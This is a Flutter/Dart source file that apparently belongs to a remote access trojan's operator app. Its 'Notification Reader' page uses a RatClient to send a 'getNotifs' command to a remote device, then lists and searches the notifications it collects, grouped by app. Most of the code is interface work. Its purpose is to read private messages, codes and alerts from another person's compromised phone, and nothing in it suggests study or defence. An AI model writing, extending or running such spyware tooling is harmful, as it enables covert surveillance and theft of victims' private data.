import 'package:flutter/material.dart';

import 'rat_client.dart';
import '../theme/app_theme.dart';

class NotificationReaderPage extends StatefulWidget {
  final RatClient client;
  final String deviceId;

  const NotificationReaderPage({
    super.key,
    required this.client,
    required this.deviceId,
  });

  @override
  State<NotificationReaderPage> createState() =>
      _NotificationReaderPageState();
}

class _NotificationReaderPageState extends State<NotificationReaderPage> {
  bool _loading = false;
  String _search = '';
  final TextEditingController _searchCtrl = TextEditingController();
  final ScrollController _scrollCtrl = ScrollController();

  RatClient get client => widget.client;
  String get deviceId => widget.deviceId;

  List<Map<String, dynamic>> get _notifications {
    final raw = client.dataFor(deviceId)['notifs'];
    if (raw is List) return raw.whereType<Map<String, dynamic>>().toList();
    return const [];
  }

  List<Map<String, dynamic>> get _filtered {
    if (_search.isEmpty) return _notifications;
    final q = _search.toLowerCase();
    return _notifications.where((n) {
      final app = (n['app'] ?? '').toString().toLowerCase();
      final title = (n['title'] ?? '').toString().toLowerCase();
      final text = (n['text'] ?? '').toString().toLowerCase();
      return app.contains(q) || title.contains(q) || text.contains(q);
    }).toList();
  }

  Map<String, List<Map<String, dynamic>>> get _grouped {
    final groups = <String, List<Map<String, dynamic>>>{};
    for (final n in _filtered) {
      final app = (n['app'] ?? 'Unknown').toString();
      groups.putIfAbsent(app, () => []).add(n);
    }
    final sorted = groups.entries.toList()
      ..sort((a, b) => a.key.toLowerCase().compareTo(b.key.toLowerCase()));
    return Map.fromEntries(sorted);
  }

  @override
  void initState() {
    super.initState();
    client.addListener(_onClientData);
    _requestNotifs();
  }

  @override
  void dispose() {
    client.removeListener(_onClientData);
    _searchCtrl.dispose();
    _scrollCtrl.dispose();
    super.dispose();
  }

  void _onClientData() {
    if (mounted) setState(() {});
  }

  void _requestNotifs() {
    setState(() => _loading = true);
    client.sendCommand(deviceId, 'getNotifs', '').then((_) {
      if (mounted) {
        Future.delayed(const Duration(seconds: 2), () {
          if (mounted) setState(() => _loading = false);
        });
      }
    }).catchError((_) {
      if (mounted) setState(() => _loading = false);
    });
  }

  String _formatTime(dynamic ts) {
    if (ts == null) return '';
    DateTime? dt;
    if (ts is num) {
      dt = DateTime.fromMillisecondsSinceEpoch(ts.toInt());
    } else {
      dt = DateTime.tryParse(ts.toString());
    }
    if (dt == null) return '';
    final now = DateTime.now();
    final diff = now.difference(dt);
    if (diff.inMinutes < 1) return 'just now';
    if (diff.inMinutes < 60) return '${diff.inMinutes}m ago';
    if (diff.inHours < 24) return '${diff.inHours}h ago';
    if (diff.inDays < 7) return '${diff.inDays}d ago';
    return '${dt.day}/${dt.month}/${dt.year}';
  }

  String _truncate(String s, [int max = 120]) {
    if (s.length <= max) return s;
    return '${s.substring(0, max)}...';
  }

  Color _appColor(String app) {
    final hash = app.hashCode;
    final colors = [
      AppTheme.neonGreen,
      AppTheme.gold,
      AppTheme.lavender,
      AppTheme.coral,
      AppTheme.sky,
      AppTheme.teal,
      AppTheme.peach,
      AppTheme.rose,
    ];
    return colors[hash.abs() % colors.length];
  }

  @override
  Widget build(BuildContext context) {
    final grouped = _grouped;
    final totalCount = _filtered.length;

    return Scaffold(
      backgroundColor: AppTheme.bgDeep,
      appBar: AppBar(
        backgroundColor: AppTheme.bgSurface,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new, color: AppTheme.textPrimary, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'NOTIFICATION READER',
              style: AppTheme.headingS.copyWith(
                color: AppTheme.gold,
                letterSpacing: 2,
              ),
            ),
            const SizedBox(height: 2),
            Text(
              '$totalCount notification${totalCount == 1 ? '' : 's'}',
              style: AppTheme.caption,
            ),
          ],
        ),
        actions: [
          if (_loading)
            const Padding(
              padding: EdgeInsets.only(right: 12),
              child: SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: AppTheme.neonGreen,
                ),
              ),
            ),
        ],
      ),
      body: Column(
        children: [
          _buildSearchBar(),
          AppTheme.cyberDivider(color: AppTheme.gold),
          Expanded(
            child: grouped.isEmpty ? _buildEmptyState() : _buildGroupedList(grouped),
          ),
        ],
      ),
      floatingActionButton: FloatingActionButton(
        backgroundColor: AppTheme.bgCard,
        foregroundColor: AppTheme.neonGreen,
        onPressed: _requestNotifs,
        child: _loading
            ? const SizedBox(
                width: 20,
                height: 20,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  color: AppTheme.neonGreen,
                ),
              )
            : const Icon(Icons.refresh, size: 22),
      ),
    );
  }

  Widget _buildSearchBar() {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 12, 16, 0),
      decoration: AppTheme.inputDecor(),
      child: TextField(
        controller: _searchCtrl,
        style: AppTheme.bodyM.copyWith(color: AppTheme.textPrimary),
        onChanged: (v) => setState(() => _search = v.trim()),
        decoration: InputDecoration(
          hintText: 'Search notifications...',
          hintStyle: AppTheme.bodyM.copyWith(color: AppTheme.textMuted),
          prefixIcon: const Icon(Icons.search, color: AppTheme.textMuted, size: 18),
          suffixIcon: _search.isNotEmpty
              ? IconButton(
                  icon: const Icon(Icons.close, color: AppTheme.textMuted, size: 16),
                  onPressed: () {
                    _searchCtrl.clear();
                    setState(() => _search = '');
                  },
                )
              : null,
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        ),
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(
            _search.isNotEmpty ? Icons.search_off : Icons.notifications_off_outlined,
            color: AppTheme.textMuted,
            size: 48,
          ),
          const SizedBox(height: 16),
          Text(
            _search.isNotEmpty ? 'NO MATCHES' : 'NO NOTIFICATIONS',
            style: AppTheme.headingS.copyWith(color: AppTheme.textMuted, letterSpacing: 2),
          ),
          const SizedBox(height: 8),
          Text(
            _search.isNotEmpty
                ? 'No notifications match "${_search}"'
                : 'Tap refresh to fetch notifications',
            style: AppTheme.bodyM.copyWith(color: AppTheme.textMuted),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 24),
          if (_search.isEmpty)
            ElevatedButton.icon(
              onPressed: _requestNotifs,
              icon: const Icon(Icons.refresh, size: 16),
              label: const Text('FETCH NOTIFICATIONS'),
              style: AppTheme.primaryButton(AppTheme.neonGreen),
            ),
        ],
      ),
    );
  }

  Widget _buildGroupedList(Map<String, List<Map<String, dynamic>>> grouped) {
    final appNames = grouped.keys.toList();
    return ListView.builder(
      controller: _scrollCtrl,
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 80),
      itemCount: appNames.length,
      itemBuilder: (context, appIdx) {
        final appName = appNames[appIdx];
        final notifs = grouped[appName]!;
        final color = _appColor(appName);
        return _buildAppGroup(appName, notifs, color);
      },
    );
  }

  Widget _buildAppGroup(String appName, List<Map<String, dynamic>> notifs, Color color) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 16, bottom: 8),
          child: Row(
            children: [
              Container(
                width: 28,
                height: 28,
                decoration: BoxDecoration(
                  color: color.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                  border: Border.all(color: color.withValues(alpha: 0.4), width: 1),
                ),
                child: Icon(
                  Icons.android,
                  size: 14,
                  color: color,
                ),
              ),
              const SizedBox(width: 10),
              Text(
                appName.toUpperCase(),
                style: AppTheme.label.copyWith(
                  color: color,
                  letterSpacing: 2,
                ),
              ),
              const SizedBox(width: 8),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                decoration: BoxDecoration(
                  color: color.withValues(alpha: 0.1),
                  borderRadius: BorderRadius.circular(4),
                ),
                child: Text(
                  '${notifs.length}',
                  style: AppTheme.caption.copyWith(color: color, fontSize: 9),
                ),
              ),
            ],
          ),
        ),
        ...notifs.map((n) => _buildNotifCard(n, color)),
        const SizedBox(height: 4),
        AppTheme.cyberDivider(color: color.withValues(alpha: 0.15)),
      ],
    );
  }

  Widget _buildNotifCard(Map<String, dynamic> notif, Color accent) {
    final title = (notif['title'] ?? '').toString();
    final text = (notif['text'] ?? '').toString();
    final time = _formatTime(notif['time']);

    return Dismissible(
      key: Key(notif['key']?.toString() ?? UniqueKey().toString()),
      direction: DismissDirection.endToStart,
      background: Container(
        alignment: Alignment.centerRight,
        margin: const EdgeInsets.only(bottom: 8),
        padding: const EdgeInsets.only(right: 20),
        decoration: BoxDecoration(
          color: AppTheme.coral.withValues(alpha: 0.15),
          borderRadius: BorderRadius.circular(AppTheme.radiusM),
          border: Border.all(color: AppTheme.coral.withValues(alpha: 0.3), width: 1),
        ),
        child: const Icon(Icons.delete_outline, color: AppTheme.coral, size: 20),
      ),
      onDismissed: (_) {},
      child: Container(
        margin: const EdgeInsets.only(bottom: 8),
        padding: const EdgeInsets.all(12),
        decoration: AppTheme.cardDecor(),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  width: 6,
                  height: 6,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: accent,
                    boxShadow: [
                      BoxShadow(
                        color: accent.withValues(alpha: 0.5),
                        blurRadius: 6,
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 8),
                if (title.isNotEmpty)
                  Expanded(
                    child: Text(
                      _truncate(title, 60),
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                      style: AppTheme.bodyL.copyWith(
                        color: AppTheme.textPrimary,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                  )
                else
                  const Expanded(
                    child: Text(
                      '(no title)',
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                      style: TextStyle(
                        color: AppTheme.textMuted,
                        fontSize: 12,
                        fontFamily: 'ShareTechMono',
                        fontStyle: FontStyle.italic,
                      ),
                    ),
                  ),
                if (time.isNotEmpty) ...[
                  const SizedBox(width: 8),
                  Text(
                    time,
                    style: AppTheme.caption.copyWith(color: AppTheme.textMuted),
                  ),
                ],
              ],
            ),
            if (text.isNotEmpty) ...[
              const SizedBox(height: 8),
              Text(
                _truncate(text, 200),
                maxLines: 4,
                overflow: TextOverflow.ellipsis,
                style: AppTheme.bodyM.copyWith(
                  color: AppTheme.textSecondary,
                  height: 1.4,
                ),
              ),
            ],
          ],
        ),
      ),
    );
  }
}
